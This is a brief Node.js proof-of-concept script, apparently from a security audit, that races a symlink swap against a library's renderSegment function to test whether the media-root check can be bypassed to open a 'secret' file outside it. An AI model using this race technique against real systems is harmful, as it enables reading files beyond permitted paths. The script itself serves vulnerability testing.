const TR=require('/workspace/n5audit-e2bb/lib/task-runners.js'),fs=require('fs'),cp=require('child_process');
const M='/tmp/n5race/media';process.env.FFMPEG_BIN='/tmp/n5race/ff.sh';
const racer=cp.spawn('sh',['-c',`cd ${M}; while :; do echo x > t.tmp; mv -f t.tmp a.wav; ln -sf /tmp/n5race/out/secret.wav l.tmp; mv -f l.tmp a.wav; done`]);
(async()=>{let ok=0,rej=0;for(let i=0;i<300;i++){try{await TR.renderSegment({audioPath:M+'/a.wav',durationSec:1,outPath:'/tmp/n5race/o/'+i+'.mp4',mediaRoot:M});ok++}catch(e){rej++}}
racer.kill();const l=fs.readFileSync('/tmp/n5race/ff.log','utf8').split('\n');console.log({ok,rej,outsideOpened:l.filter(x=>x.includes('/out/secret')).length,inside:l.filter(x=>x.includes('/media/')).length});})();
